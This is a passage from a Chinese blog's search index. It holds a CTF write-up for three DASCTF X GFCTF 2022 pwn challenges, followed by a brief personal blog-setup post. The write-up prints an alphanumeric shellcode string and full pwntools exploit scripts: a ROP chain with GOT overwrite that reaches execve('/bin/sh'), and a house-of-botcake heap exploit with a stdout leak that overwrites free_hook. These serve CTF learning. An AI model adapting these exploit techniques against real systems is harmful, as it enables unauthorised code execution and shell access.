PTR [rcx+0x4a], eax<br><br>xor eax,0x61313131<br>xor eax,0x41613161<br>xor eax,0x464c4955<br>xor DWORD PTR [rcx+0x4e], eax<br><br>push rcx<br>pop rax<br>xor eax,0x31313531<br>xor eax,0x61616135<br>xor eax,0x50505044<br>push rax<br></code></pre></td></tr></table></figure><p>剩余随便找个填充到0x200，这里找了Y</p><p>shellcode这么一串</p><p><code>RX5111151511PY511B1515C151ABA5WDCI1AB551115a1Ba5ZMCX1AF511115Aaaa5NAPX1AJ511115Aa1A5NA1W1ANPQX5A1115Q111PYX5AAa15KPPV1AB5a1115A11A5F1XV1AF5111A5B1BD5XGCZ1AJ5a1115AA115GW1B1ANPQX5a1115Q111PYX51A115ADAA5PZLZ1AB5111151a115YOX11AF5a1115AAAB5NRGC1AJ51Aa15aBA15VXSH1ANPQX5A1115Q111PYX511115111a511GE1AB5a1115A1A15HYNM1AF5AaaA5URZP1AJ511115AAaA5LRXC1ANPQX511115A111PYX51Aaa5XPKC1AB5111151A1a5DCOA1AF511a15DAAA5XRSO1AJ5111a5a1aA5UILF1ANQX5151155aaa5DPPPPYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</code></p><p>getshell</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/get.png" alt="get"></p><h2 id="R-P">R()P</h2><p>保护没开pie，got表可写</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/%E9%A2%982%E4%BF%9D%E6%8A%A4.png" alt="题2保护"></p><p>题目存在一个栈溢出</p><p>这题是高版本的gcc编译的</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/2.34.png" alt="2.34"></p><p>没了常规的<code>pop rdi;ret</code>   <code>pop_rsi_r15</code>，也没有了csu等gadget用</p><p>主要是如何去rop</p><h3 id="0x01能控制的参数">0x01能控制的参数</h3><p><strong>rax：</strong> 可以由栈上的值控制，gdb调试可得是 rsp+0xc处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:000000000040116D                 mov     eax, dword ptr [rsp+18h+buf]<br>.text:0000000000401171                 add     rsp, 18h<br>.text:0000000000401175                 retn<br></code></pre></td></tr></table></figure><p><strong>rdi:</strong></p><p>可以由_bss_start的地址值控制，rax我们可以事先控制为ret的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0000000000401099                 mov     edi, offset __bss_start<br>.text:000000000040109E                 jmp     rax<br></code></pre></td></tr></table></figure><p><strong>rsi：</strong></p><p>可以在要调用read时事先控制好rax，就能控制rsi</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:000000000040115A                 mov     rsi, rax        ; buf<br>.text:000000000040115D                 mov     edx, dword ptr [rsp+18h+buf] ; nbytes<br>.text:0000000000401161                 xor     edi, edi        ; fd<br>.text:0000000000401163                 mov     eax, 0<br>.text:0000000000401168                 call    _read<br>.text:000000000040116D                 mov     eax, dword ptr [rsp+18h+buf]<br>.text:0000000000401171                 add     rsp, 18h<br>.text:0000000000401175                 retn<br></code></pre></td></tr></table></figure><p><strong>rdx：</strong></p><p>rdx只有在调用read前有一段赋值为栈上的值的操作</p><p>但如果我们要read的话rdx也就是长度不能为0，但是要造的execve的参数只需满足使rdx一个地址指向0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:000000000040115D                 mov     edx, dword ptr [rsp+18h+buf] ; nbytes<br></code></pre></td></tr></table></figure><h3 id="0x02-ROP思路">0x02 ROP思路</h3><p>最后我们要rop出<code>execve('/bin/sh',0,0)</code></p><p>参数:</p><p><code>rdi='/bin/sh'</code></p><p><code>rsi=0  or   地址-&gt;0</code></p><p><code>rdx=0 or  地址-&gt;0</code></p><p><strong>ROP链：</strong></p><p>修改rax，改read的rsi为_bss_start，（read的rdx控制为read_got）,</p><p>调用read，写入/bin/sh的同时修改rax为read_got，改read的rsi为read_got，（read的rdx控制为某个地址指向0），</p><p>调用read，改read_got为syscall+0x1b的同时改rdx为某个地址指向0（我本地调syscall前的0x1b破坏了寄存器的值,所以多了0x1b）</p><p>修改rax，控制rdi为/bin/sh</p><p>修改rax为0，控制rsi为0</p><p>现在我们控制了:</p><p><code>read_got=syscall</code></p><p><code>rdi='/bin/sh'</code></p><p><code>rsi=0</code></p><p><code>rdx=地址-&gt;0</code></p><p>调用read即getshell</p><h3 id="0x03-本地exp">0x03 本地exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib64/ld-linux-x86-64.so.2&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    <span class="hljs-comment">#r = process(local_file)</span><br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch = elf.arch</span><br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    read_plt=elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>    read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>    bss_start=<span class="hljs-number">0x404018</span><br><br>    ret=<span class="hljs-number">0x40101a</span><br>    rax=<span class="hljs-number">0x40116d</span><br>    rsi_call_read=<span class="hljs-number">0x401141</span><br>    rdi=<span class="hljs-number">0x401099</span><br>    read_rax=<span class="hljs-number">0x40115a</span><br>    <br>    se(p32(<span class="hljs-number">0x100</span>))<br>    payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(rax)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(bss_start)+p64(<span class="hljs-number">0</span>)<br>    payload+=p64(read_rax)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(read_got)+p64(<span class="hljs-number">0</span>)<br>    payload+=p64(read_rax)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(bss_start+<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0</span>)<br>    payload+=p64(rax)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(ret)+p64(<span class="hljs-number">0</span>)<br>    payload+=p64(rdi)<br>    payload+=p64(rax)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0x3b</span>)+p64(<span class="hljs-number">0</span>)<br>    payload+=p64(rsi_call_read)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)<br>    se(payload)<br>    se(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)<br>    se(<span class="hljs-string">b&#x27;\x3b\x1a\xea&#x27;</span>)<br>    r.recv(timeout = <span class="hljs-number">1</span>)<br>    r.interactive()<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    i=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        r=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;have try:&#x27;</span>+<span class="hljs-built_in">str</span>(i))<br>            pwn()<br>        <span class="hljs-keyword">except</span>:<br>            r.close()<br>        i+=<span class="hljs-number">1</span><br>r.interactive()<br><br></code></pre></td></tr></table></figure><p>最后要改read_got为syscall+0x1b 我本地有三个位要爆破，1/4096成功，</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/baopo.png" alt="baopo"></p><p>不过这题远端只要爆破一位1/16，我真的是吃饱了撑的</p><h2 id="magic-book">magic_book</h2><h3 id="0x01程序分析">0x01程序分析</h3><p>保护全开</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/%E9%A2%983%E4%BF%9D%E6%8A%A4.png" alt="题3保护"></p><p>有add和delete功能</p><p>选择9的话还有只能使用1次的uaf</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/uaf.png" alt="uaf"></p><p>没有show功能，要泄露libc就要打IO_stdout</p><p>用的libc是2.31的，还能用hook</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/libc2.31%E9%A2%983.png" alt="libc2.31题3"></p><h3 id="0x02利用思路">0x02利用思路</h3><p>1.使用house of botcake 的手法，在仅使用一次uaf的情况下，避免了tcache的key值检测，造成tcache poioning的效果</p><p>（victim堆在同一个地址，一个在tcachebin，一个在unsortbin）</p><p>2.切割unsortbin，修改unsortbin中存的main_arena+96地址为stdout（最后三位偏移不变，第四位要爆破一位1/16）</p><p>改unsorbin中victim的fd指向存有stdout的堆的地址（堆地址也是一样，第四位要爆破1/16），造成tcache poioning指向stdout</p><p>3.分配堆到stdout，然后这么填<code>flat(0xfbad1800,0,0,0,b'\x00')</code>就能靠puts泄露出libc了</p><p>4.复用house of botcake ，往free_hook里写system,释放带有/bin/sh的chunk</p><p>所以成功率1/256</p><p><strong>exp：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/pwn/libc&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/pwn/ld&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><br><span class="hljs-comment">#------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sa(<span class="hljs-string">&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">uaf</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#------house_of_botcake--------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;padding&#x27;</span>)<span class="hljs-comment">#0~6</span><br>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;padding&#x27;</span>)<span class="hljs-comment">#7</span><br>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;padding&#x27;</span>)<span class="hljs-comment">#8</span><br>    add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;padding&#x27;</span>)<span class="hljs-comment">#9</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        delete(i)<br>    uaf(<span class="hljs-number">8</span>)<br>    delete(<span class="hljs-number">7</span>)<br>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;padding&#x27;</span>)<span class="hljs-comment">#10</span><br>    delete(<span class="hljs-number">8</span>)<br>    <span class="hljs-comment">#------_IO_stdout leak------------------</span><br>    add(<span class="hljs-number">0x50</span>,p16(<span class="hljs-number">0x26a0</span>))<span class="hljs-comment">#11</span><br>    add(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>)+p16(<span class="hljs-number">0xb690</span>))<span class="hljs-comment">#12</span><br>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<span class="hljs-comment">#13</span><br>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<span class="hljs-comment">#14</span><br>    add(<span class="hljs-number">0x80</span>,flat(<span class="hljs-number">0xfbad1800</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<span class="hljs-comment">#15</span><br>    stdin=libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br>    libc_base=uu64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>,timeout=<span class="hljs-number">0.1</span>)[-<span class="hljs-number">6</span>:])-stdin<br><br>    <span class="hljs-keyword">if</span> libc_base == -stdin:<br>        exit(-<span class="hljs-number">1</span>)<br><br>    info(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>    system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    <span class="hljs-comment">#-------re botcake------------------------------</span><br>    delete(<span class="hljs-number">13</span>)<br>    delete(<span class="hljs-number">12</span>)<br>    add(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>)+p64(free_hook))<span class="hljs-comment">#16</span><br>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<span class="hljs-comment">#17</span><br>    add(<span class="hljs-number">0x80</span>,p64(system))<span class="hljs-comment">#18</span><br>    delete(<span class="hljs-number">17</span>)<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment">#r=process(&#x27;./pwn&#x27;)</span><br>        r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29922</span>)<br>        <span class="hljs-keyword">try</span>:<br>            pwn()<br>            r.interactive()<br>        <span class="hljs-keyword">except</span>:<br>            r.close()<br><br></code></pre></td></tr></table></figure><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/%E9%A2%983shell.png" alt="题3shell"></p><script src="https://utteranc.es/client.js" repo="nqoinaen/comment" issue-term="pathname" theme="github-light" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>ctf比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rop</tag>
      
      <tag>IO_leak</tag>
      
      <tag>shellocde</tag>
      
      <tag>house of botcake</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一段新旅程</title>
    <link href="/2022/10/25/%E6%96%B0%E7%9A%84%E6%97%85%E7%A8%8B/"/>
    <url>/2022/10/25/%E6%96%B0%E7%9A%84%E6%97%85%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p><strong>算是一个新的开始吧</strong>，以前在<a href="https://blog.csdn.net/m0_51251108?type=blog">csdn</a>上写博客，心血来潮想搭个人博客。一番捣鼓后，用的是<code>Hexo</code>框架<code>fluid</code>主题，架设在<code>github pages</code>上，整了nqoinaen.cn这个域名。<strong>希望自己以后能认真对待这个博客吧。</strong></p><script src="https://utteranc.es/client.js" repo="nqoinaen/comment" issue-term="pathname" theme="github-light" crossorigin="anonymous" async></script>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
